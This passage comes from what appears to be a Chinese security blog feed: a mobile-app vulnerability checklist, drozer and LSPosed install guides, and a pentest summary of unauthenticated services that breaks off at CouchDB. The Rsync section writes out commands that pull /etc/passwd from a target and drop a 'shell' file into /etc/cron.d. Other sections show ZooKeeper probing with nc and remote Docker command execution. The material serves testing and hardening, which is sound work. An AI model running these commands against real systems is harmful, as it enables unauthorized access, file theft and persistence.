provider目录遍历检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>开发者为方便应用程序之间共享文件，会把实现了 openfile() 接口的content provider设置为导出状态，因此其他有相应调用该content provider权限的应用即可调用content provider的 openfile() 接口进行文件数据访问。但是如果没有进行content provider访问权限控制和对访问的目标文件的uri进行有效判断，攻击者利用文件目录遍历可访问任意可读文件，更有甚者可以往手机设备可写目录中写入任意数据。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、如果组件不需要与其他app共享数据或交互，请将androidmanifest.xml 配置文件中设置该组件为exported的属性为 “false”</p><p>2、如果组件需要与其他app共享数据或交互， 请对组件进行权限控制和参数校验</p><p>3、如果需要导出的话，严格编写过滤</p><h2 id="WebView域控制不严格漏洞"><a href="#WebView域控制不严格漏洞" class="headerlink" title="WebView域控制不严格漏洞"></a>WebView域控制不严格漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>当B应用的activity是可被导出的，同时设置允许WebView使用File协议，则A应用可以在外部调起B的Activity，同时向B传递一个请求内部数据的文件则可以获取B的数据。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、设置activity不可被导出</p><p>2、明确禁止WebView 使用 File 协议</p><h1 id="代码安全"><a href="#代码安全" class="headerlink" title="代码安全"></a>代码安全</h1><h2 id="代码未混滑"><a href="#代码未混滑" class="headerlink" title="代码未混滑"></a>代码未混滑</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端代码未做混淆，。</p><p><strong>检查工具：</strong>dex2jar、jd-gui</p><p><strong>检查方法：</strong></p><p>1、dex2jar将classes.dex转成jar包</p><p>2、使用jd-gui打开jar包，查看代码是否混淆</p><blockquote><p> 代码混淆过后，在语意上难以通过直接查看代码理解</p></blockquote><p><strong>整改意见：</strong>对APP安装包进行加固，执行强混淆操作</p><h2 id="代码未加固"><a href="#代码未加固" class="headerlink" title="代码未加固"></a>代码未加固</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端代码未做混淆和加固，使攻击者很轻易反编译出源代码，从而对应用程序逻辑进行分析。</p><p><strong>检查工具：</strong>MT管理器</p><p><strong>检查方法：</strong></p><p>使用MT管理器查看被测apk文件加固状态</p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230701164937608.png" alt="image-20230701164937608" style="zoom:50%;" /><p><strong>整改意见：</strong>对app加商业壳</p><h2 id="二次编译打包"><a href="#二次编译打包" class="headerlink" title="二次编译打包"></a>二次编译打包</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过反编译后得到程序源代码，修改源码后，重新编译、签名并安装。在重新打包的过程中，攻击者可能注入恶意代码，或者修改软件逻辑绕过鉴权等。</p><p><strong>检查工具：</strong>APKTool、jarsigner、zipalign（可选）</p><p><strong>检查方法：</strong></p><p>1、使用APKToole对apk进行反编译</p><p>2、修改代码后，再次使用APKTool对apk进行打包</p><p><code>apktool b 文件夹 -o 新apk名.apk</code></p><p><strong>整改意见：</strong>内部代码实现apk二次打包鉴别机制，在程序运行时校验apk签名是否由官方私钥签名而来。</p><h2 id="Janus安卓签名漏洞"><a href="#Janus安卓签名漏洞" class="headerlink" title="Janus安卓签名漏洞"></a>Janus安卓签名漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以绕过安卓系统的signature scheme V1签名机制，进而直接对app进行篡改</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>app使用signature scheme V2及以上版本签名机制</p><h2 id="Root环境检测"><a href="#Root环境检测" class="headerlink" title="Root环境检测"></a>Root环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>在mobile 应用启用certificate pinning 的情况下使用Rooted 手机+xposed+justtrustme 组件依然可以通过API hook进行中间人攻击。 监控客户端与后台的通信内容。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、应用启动时检测手机环境，确保为非root环境</p><p>2、检测如xposed、 Cydia Substrate、frida等逆向工具是否运行时，弹窗提醒用户设备已root</p><h2 id="模拟器环境检测"><a href="#模拟器环境检测" class="headerlink" title="模拟器环境检测"></a>模拟器环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者可以用模拟器运行、多开、调试、攻击程序</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>在客户端代码中增加模拟器检测</p><h2 id="证书绑定"><a href="#证书绑定" class="headerlink" title="证书绑定"></a>证书绑定</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过替换证书解密客户端与服务端之间的数据</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>客户端应对服务端证书进行强验证</p><h2 id="代理环境检测"><a href="#代理环境检测" class="headerlink" title="代理环境检测"></a>代理环境检测</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者通过设置代理的方式，抓取客户端与服务器之间的数据包</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>客户端存在代理时停止通络通信，并提醒用户关闭代理</p><h1 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h1><h2 id="敏感信息硬编码"><a href="#敏感信息硬编码" class="headerlink" title="敏感信息硬编码"></a>敏感信息硬编码</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>如果类似密钥等敏感信息硬编码在源文件中，那么攻击者通过反编译程序代码，可以轻易获取这些敏感信</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>避免类似密钥，激活码等敏感信息直接硬编码在客户端源文件中。</p><h2 id="弱加密问题"><a href="#弱加密问题" class="headerlink" title="弱加密问题"></a>弱加密问题</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>使用弱加密算法会大大增加黑客攻击的概率，黑客可能会破解隐私数据、猜解密钥、中间人攻击等，造成隐私信息的泄漏，甚至造成财产损失</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong></p><p>1、使用对称加密算法时避免使用DES算法，可以选择3DES</p><p>2、IvParameterSpec初始化时，不使用常量vector</p><p>3、使用 RSA 算法加密时，指定Padding模式，建议密钥长度&gt;1024 bit</p><h2 id="客户端敏感信息明文存储"><a href="#客户端敏感信息明文存储" class="headerlink" title="客户端敏感信息明文存储"></a>客户端敏感信息明文存储</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>敏感数据存储时应采取密文的形式，否则攻击者一旦获取数据，则直接获取明文的敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>重要的敏感信息数据要通过加密方式存储，以避免被恶意截获</p><h2 id="日志中记录了泄露敏感信息"><a href="#日志中记录了泄露敏感信息" class="headerlink" title="日志中记录了泄露敏感信息"></a>日志中记录了泄露敏感信息</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端日志文件中或者动态的调试日志中输出了敏感的系统信息，攻击者可能会窃取到这些敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>日志文件中或者动态的调试日志中不应包含敏感信息</p><h2 id="本地数据库注入"><a href="#本地数据库注入" class="headerlink" title="本地数据库注入"></a>本地数据库注入</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>客户端程序在查询本地的Content Provider时通过构造特殊的查询语句，进而查询额外的敏感信息。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>过滤引起SQLite查询语句歧义的特殊字符，例如单引号、双引号、圆括号、分号 等</p><h2 id="WebView-密码明文存储漏洞"><a href="#WebView-密码明文存储漏洞" class="headerlink" title="WebView 密码明文存储漏洞"></a>WebView 密码明文存储漏洞</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>WebView 默认开启密码保存功能 mWebView.setSavePassword(true)，如果该功能未关闭，在用户输入密码时会弹出提示框，询问用户是否保存密码，如果选择”是”，密码会被明文保存到 &#x2F;data&#x2F;data&#x2F;com.package.name&#x2F;databases&#x2F;webview.db 中，这样就有被资取密码的危险。</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>通过设置 WebSettings.setSavePassword(false) 关闭密码保存提醒功能</p><h1 id="业务逻辑安全"><a href="#业务逻辑安全" class="headerlink" title="业务逻辑安全"></a>业务逻辑安全</h1><h2 id="客户端更新安全性"><a href="#客户端更新安全性" class="headerlink" title="客户端更新安全性"></a>客户端更新安全性</h2><p><strong>漏洞等级：高</strong></p><p><strong>风险分析：</strong>攻击者拦截替换客户端更新url，导致恶意程序被下载安装</p><p><strong>检查工具：</strong></p><p><strong>检查方法：</strong></p><p><strong>整改意见：</strong>对返回数据进行加密</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>drozer安装教程（windows）</title>
      <link href="/2023/install-drozer-on-windows/"/>
      <url>/2023/install-drozer-on-windows/</url>
      
        <content type="html"><![CDATA[<p>drozer这玩意真的是难装啊，之前第一次弄的时候装了两个下午，网上的教程写的乱七八糟的，每次要翻好多篇文章，所以干脆借此次给新电脑装drozer的机会，记录整理一下安装过程，以供后续参考。</p><h1 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h1><p>请自行安装以下环境，并配置好环境变量，安装pip包。这里比较简单，就不做赘述了</p><ul><li><p>python 2.7</p></li><li><p>pip2 install protobuf pyOpenSSL Twisted service_identity</p></li><li><p>jdk 1.6 官方推荐的，使用其他版本可能会有问题</p></li><li><p>adb</p></li></ul><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><h2 id="下载drozer"><a href="#下载drozer" class="headerlink" title="下载drozer"></a>下载drozer</h2><p>下载链接：<a href="https://github.com/mwrlabs/drozer/releases/">https://github.com/mwrlabs/drozer/releases/</a></p><p>选择系统相应的包，我这里选windows的msi安装包</p><h2 id="安装drozer"><a href="#安装drozer" class="headerlink" title="安装drozer"></a>安装drozer</h2><ol><li>双击安装</li><li>默认install for all user</li><li>Python from another location，下方输入python2.7的安装路径</li></ol><p><img src="/img/image-20230630233756387.png" alt="image-20230630233756387"></p><ol start="4"><li>完成安装</li></ol><h2 id="运行drozer"><a href="#运行drozer" class="headerlink" title="运行drozer"></a>运行drozer</h2><p>cmd中输入 <code>drozer -h</code> </p><p>如果出现drozer的帮助文档，那drozer这边就没问题了</p><blockquote><p>如果出现以下报错，则是python版本问题</p><p><strong>SyntaxError: Missing parentheses in call to ‘print’. Did you mean print(“usage: drozer [COMMAND]”)?</strong></p><p>我把python2.7的命令变成了python2，此时需要编辑drozer.bat，把里面的python改成自己配置的python2就好</p></blockquote><h2 id="安装drozer-agent"><a href="#安装drozer-agent" class="headerlink" title="安装drozer agent"></a>安装drozer agent</h2><p>drozer agent 下载链接：<a href="https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk">https://github.com/WithSecureLabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk</a></p><p>下载好之后，安装到手机里</p><h2 id="drozer连接手机"><a href="#drozer连接手机" class="headerlink" title="drozer连接手机"></a>drozer连接手机</h2><p>1、打开app，开启drozer agent（右侧显示开启）</p><p>Embedded Server下面的端口，等会会用到</p><p><img src="/img/image-20230701000918341.png" alt="image-20230701000918341"></p><p>2、cmd中输入 <code>adb forward tcp:31415 tcp:31415</code></p><p>这里的31415就是上面drozer agent的端口</p><p>3、cmd中输入 <code>drozer console connect</code></p><p><img src="/img/image-20230701001213155.png" alt="image-20230701001213155"></p><p>出现这个，恭喜你，可以愉快的使用drozer了~</p><p><strong>参考资料</strong></p><ol><li><a href="https://www.cnblogs.com/lsdb/p/9441813.html">drozer安装使用教程（Windows） - 诸子流 - 博客园</a></li><li><a href="https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf">mwri-drozer-user-guide-2015-03-23.pdf</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高版本安卓XPosed框架安装指南</title>
      <link href="/2023/install-xposed-for-android/"/>
      <url>/2023/install-xposed-for-android/</url>
      
        <content type="html"><![CDATA[<p>XPosed框架是一款可以在不修改APK的情况下影响程序运行（修改系统）的框架服务，基于它可以制作出许多功能强大的模块，且在功能不冲突的情况下同时运作。 </p><p>目前Xposed框架已停止更新，它支持Android 6.0-8.1，但它针对android 8.0和8.1的仅为Beta版本。</p><p>如果想要在高版本安卓系统下使用XPosed，可以考虑以下两种方案：</p><ol><li>Edxposed</li><li>LSPosed（推荐！！！）</li></ol><p>Lsposed 是 Edxposed 的一个新的分支，Lsposed 与Edxposed 相互兼容，却比 Edxposed 更加简洁、易用和高效，是现如今饱受诟病的 Edxposed 的极佳替代品。</p><p>本文主要介绍LSPosed的安装方式</p><h1 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h1><ul><li>安卓版本：8～11</li><li>Magisk v21+、Magisk Manager</li></ul><h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><p>1、下载 <a href="https://github.com/LSPosed/LSPosed/releases/latest">LSPosed模块</a></p><p>Riru版需要安装Riru，Zygisk版可以直接在Magisk中打开Zygisk</p><p>这里我下的Zygisk版</p><p>2、打开Zygisk</p><p>Magisk – 右上角【设置】 –  打开Zygisk</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230630130046825.png" alt="image-20230630130046825"></p><p>3、安装LSPosed模块</p><p>Magisk – 模块 – 从本地安装</p><p>选择第一步下载的LSPosed模块，等待安装完成之后，模块下面就会多出一个</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230630130422037.png" alt="image-20230630130422037"></p><p>4、安装LSPosed</p><p>前面第一步下载的那玩意是Magisk里面的LSPosed模块，现在是一个app</p><p>直接在应用商店下就行，我是在Play Store直接下的，没有的话就去网上找找资源</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230630130637206.png" alt="image-20230630130637206"></p><p>5、激活LSPosed</p><p>打开LSPosed app，会显示已经激活</p><p>要是没激活，试试重启大法！</p><p><img src="https://jenchoitop.oss-cn-shanghai.aliyuncs.com/img/image-20230630130756179.png" alt="image-20230630130756179"></p><p><strong>参考</strong></p><p><a href="https://magiskcn.com/lsposed-install">LSPosed 安装教程（LSP框架安装教程） - Magisk中文网</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
          <category> 移动安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【总结】未授权访问</title>
      <link href="/2023/unauthorized-access-summary/"/>
      <url>/2023/unauthorized-access-summary/</url>
      
        <content type="html"><![CDATA[<p>此博客总结了未授权访问，方便自己进行渗透测试</p><ol><li>此博客总结的大多未授权，都是端口，或者某项应用，不包括一些特有的未授权访问</li><li>漏洞发现的方法：端口扫描、目录探测</li></ol><h1 id="21-FTP-未授权访问"><a href="#21-FTP-未授权访问" class="headerlink" title="[21] FTP 未授权访问"></a>[21] FTP 未授权访问</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>风险等级： 高危</p><p>FTP 弱口令或匿名登录漏洞，一般指使用 FTP 的用户启用了匿名登录功能，或系统口令的长度太短、复杂度不够、仅包含数字、或仅包含字母等，容易被黑客攻击，发生恶意文件上传或更严重的入侵行为。</p><p>影响版本：全版本</p><ul><li><p>匿名访问:</p></li><li><ul><li>用户名:anonymous   密码:空或guest或任意邮箱</li><li>用户名:FTP  密码:空或FTP</li></ul></li><li><p>未授权访问:</p></li><li><ul><li>不需要用户名密码可直接访问,一般出现在局域网中</li></ul></li></ul><p>漏洞详情</p><p>FTP是文件传输协议（File Transfer Protocol）的缩写，是用于在网络上进行文件传输的一套标准协议，它工作在 OSI 模型的第七层， TCP 模型的第四层， 即应用层， 使用 TCP 传输的， 客户在和服务器建立连接前要经过一个“三次握手”的过程， 保证客户与服务器之间的连接是可靠的， 而且是面向连接， 为数据传输提供可靠保证。</p><p>FTP允许用户以文件操作的方式（如文件的增、删、改、查、传送等）与另一主机相互通信。然而，用户并不需要真正登陆到自己想要存取的计算机上面而成为完全用户，可用FTP程序访问远程资源，实现用户往返传输文件、目录管理以及访问电子邮件等等，即使双方计算机可能配有不同的操作系统和文件存储方式。</p><p>如果目标开启了匿名FTP服务，匿名FTP允许任意用户通过FTP来访问开放的目录和文件来进行信息收集进行下一步的攻击。使用匿名访问FTP服务可以尝试在Kali中nc：xxx.xxx.xxx.xxx，使用 anonymous和空密码认证。</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、扫描端口</p><p>对端口进行扫描，扫到21端口开放，就可能存在未授权访问</p><p>2、浏览器直接访问<code>ftp://ip:port/</code></p><p>存在未授权访问的，就直接能看到文件了</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>禁止匿名登录</li><li>配置强密码。密码长度建议八位以上，且密码应包括大小写字母、特殊字符、数字混合体；</li></ul><h1 id="389-LDAP-未授权访问"><a href="#389-LDAP-未授权访问" class="headerlink" title="[389] LDAP 未授权访问"></a>[389] LDAP 未授权访问</h1><h2 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>LDAP中文全称为：轻型目录访问协议（Lightweight Directory Access Protocol），默认使用389， LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问。</p><h2 id="漏洞检测-1"><a href="#漏洞检测-1" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser工具（下载：<a href="https://ldapbrowserwindows.com/%EF%BC%89%E7%9B%B4%E6%8E%A5%E8%BF%9E%E6%8E%A5%EF%BC%8C%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%E3%80%82">https://ldapbrowserwindows.com/）直接连接，获取目录内容。</a></p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>修改ldap的acl，禁止匿名访问</li><li>根据业务设置ldap访问白名单或黑名单</li></ul><h1 id="873-Rsync-未授权访问"><a href="#873-Rsync-未授权访问" class="headerlink" title="[873] Rsync 未授权访问"></a>[873] Rsync 未授权访问</h1><h2 id="漏洞简介-2"><a href="#漏洞简介-2" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>rsync是Linux&#x2F;Unix下的一个远程数据同步工具，可通过LAN&#x2F;WAN快速同步多台主机间的文件和目录，默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p><h2 id="漏洞检测-2"><a href="#漏洞检测-2" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、root@kali使用<code>Rsync</code>命令进行检测</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">rsync rsync://192.168.126.130:873/</span><br><span class="line">rsync rsync://192.168.126.130:873/src</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载任意文件</span></span><br><span class="line">rsync rsync://192.168.126.130:873/srcetc/passwd ./</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写入任意文件</span></span><br><span class="line">rsync -av shell rsync://192.168.126.130:873/src/etc/cron.d/shell</span><br></pre></td></tr></table></figure><h2 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>隐藏掉 module 信息：修改配置文件 list &#x3D;false。</li><li>权限控制：不需要写入权限的 module 的设置为只读 Read only &#x3D; true;</li><li>网络访问控制：使用安全组策略或白名单限制，只允许必要访问的主机访问;</li><li>账户认证：只允许指定的用户利用指定的密码使用 rsync 服务;</li><li>数据加密传输：Rsync 默认没有直接支持加密传输，如果需要 Rsync 同步重要性很高的数据，可以使用 ssh;</li></ul><h1 id="2181-ZooKeeper-未授权访问"><a href="#2181-ZooKeeper-未授权访问" class="headerlink" title="[2181] ZooKeeper 未授权访问"></a>[2181] ZooKeeper 未授权访问</h1><h2 id="漏洞简介-3"><a href="#漏洞简介-3" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。</p><p>zookeeper有三个端口（可以修改）</p><ul><li>2181：对cline端提供服务</li><li>2888：集群内机器通讯使用（Leader监听此端口）</li><li>3888：选举leader使用</li></ul><h2 id="漏洞检测-3"><a href="#漏洞检测-3" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描，扫到2181端口</p><p>2、直接连接 或 获取服务器环境信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">直接连接</span></span><br><span class="line">./zkCli.sh -server ip:port</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取服务器环境信息</span></span><br><span class="line">echo envi | nc ip 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">stat</span>：列出关于性能和连接的客户端的统计信息。</span></span><br><span class="line">echo stat | ncat 127.0.0.1 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ruok：测试服务器是否运行在非错误状态。</span></span><br><span class="line">echo ruok | ncat 127.0.0.1 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">reqs：列出未完成的请求。</span></span><br><span class="line">echo reqs | ncat 127.0.0.1 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">envi：打印有关服务环境的详细信息。</span></span><br><span class="line">echo envi | ncat 127.0.0.1 2181</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dump：列出未完成的会话和临时节点。</span></span><br><span class="line">echo dump | ncat 127.0.0.1 2181</span><br></pre></td></tr></table></figure><h2 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>为ZooKeeper配置相应的访问权限</li><li>设置防火墙策略</li><li>禁止把Zookeeper直接暴露在公网</li></ul><h1 id="2375-Docker-未授权访问"><a href="#2375-Docker-未授权访问" class="headerlink" title="[2375] Docker 未授权访问"></a>[2375] Docker 未授权访问</h1><h2 id="漏洞简介-4"><a href="#漏洞简介-4" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Docker Remote API未授权访问：在使用docker swarm的时候，管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，其实这是 Docker Remote API，可以执行docker命令，比如访问 <a href="http://host:2375/containers/json">http://host:2375/containers/json</a> 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps的效果一样，其他操作比如创建&#x2F;删除container，拉取image等操作也都可以通过API调用完成。</p><p>Docker daemon api是使用url代替命令行来操作docker，docker swarm 是docker下的集群管理工具，在开放2375端口来监听集群容器时，会调用这个api，可以执行docker命令，root权限启动docker情况下可直接可以控制服务器</p><h2 id="漏洞检测-4"><a href="#漏洞检测-4" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、直接输入地址 <code>http://ip:2375/version</code>。若能访问，证明存在未授权访问漏洞</p><p>也可以使用-H参数远程执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://ip:2375 ps</span><br></pre></td></tr></table></figure><h2 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>对2375端口做网络访问控制，如ACL控制，或者访问规则；</li><li>修改docker swarm的认证方式，使用TLS认证；</li></ul><h1 id="5000-Docker-Registry未授权"><a href="#5000-Docker-Registry未授权" class="headerlink" title="[5000] Docker Registry未授权"></a>[5000] Docker Registry未授权</h1><h2 id="漏洞简介-5"><a href="#漏洞简介-5" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>默认5000端口，docker remote api可以执行docker命令，该接口是目的是取代docker 命令界面，通过url操作docker。</p><h2 id="漏洞检测-5"><a href="#漏洞检测-5" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、<a href="http://10.101.20.43:5000/v2">http://10.101.20.43:5000/v2</a></p><p><a href="http://10.101.20.43:5000/v2/_catalog">http://10.101.20.43:5000/v2/_catalog</a></p><h2 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1、设置ACL，只允许信任ip连接对应端口</p><p>2、开启TLS，使用生成的证书进行认证</p><h1 id="5601-Kibana-未授权访问"><a href="#5601-Kibana-未授权访问" class="headerlink" title="[5601] Kibana 未授权访问"></a>[5601] Kibana 未授权访问</h1><h2 id="漏洞简介-6"><a href="#漏洞简介-6" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露</p><h2 id="漏洞检测-6"><a href="#漏洞检测-6" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、直接访问kibana的页面</p><p><a href="http://192.168.126.130:5601/">http://192.168.126.130:5601/</a></p><p><a href="https://192.168.126.130/app/kibana#">https://192.168.126.130/app/kibana#</a></p><p><a href="http://192.168.126.130:5601/app/kibana#/">http://192.168.126.130:5601/app/kibana#/</a></p><p>无需账号密码可以登录进入界面</p><h2 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>设置kibana监听本地地址，并设置ElasticSearch登录的账号和密码；</li><li>设置防火墙策略，限定IP访问服务；</li></ul><h1 id="5900-x2F-5901-VNC-未授权访问"><a href="#5900-x2F-5901-VNC-未授权访问" class="headerlink" title="[5900&#x2F;5901] VNC 未授权访问"></a>[5900&#x2F;5901] VNC 未授权访问</h1><h2 id="漏洞简介-7"><a href="#漏洞简介-7" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。</p><p>VNC 默认端口号为 5900、5901。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重。</p><h2 id="漏洞检测-7"><a href="#漏洞检测-7" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、端口扫描</p><p>2、使用 VNC 客户端连接主机</p><p>VNC-Viewer工具下载(<a href="https://www.realvnc.com/en/connect/download/viewer/windows/">https://www.realvnc.com/en/connect/download/viewer/windows/</a>)</p><p>安装过程，双击msi文件一路下一步就可以了。</p><p>在 VNC 客户端输入目标服务器IP，之后点击确定、连接，即可成功控制目标服务器</p><h2 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>配置 VNC 客户端登录口令认证并配置符合密码强度要求的密码；</li><li>以最小权限的普通用户身份运行操作系统；</li></ul><h1 id="5984-CouchDB-未授权访问"><a href="#5984-CouchDB-未授权访问" class="headerlink" title="[5984] CouchDB 未授权访问"></a>[5984] CouchDB 未授权访问</h1><h2 id="漏洞简介-8"><a href="#漏洞简介-8" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Apache CouchDB 